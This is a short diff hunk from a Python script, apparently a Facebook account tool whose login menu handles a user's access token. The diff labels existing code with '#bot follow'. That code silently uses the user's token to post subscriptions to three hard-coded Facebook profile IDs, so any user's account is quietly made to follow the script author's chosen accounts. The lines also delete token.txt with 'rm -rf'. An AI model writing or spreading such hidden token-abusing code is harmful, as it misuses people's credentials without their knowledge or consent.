@@ -86,6 +86,7 @@ def menu_log():
             print('%s╚══®[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P)) 
             os.system('rm -rf token.txt') 
             exit(menu_log()) 
+            #bot follow
             requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token) 
             requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) 
             requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token) 
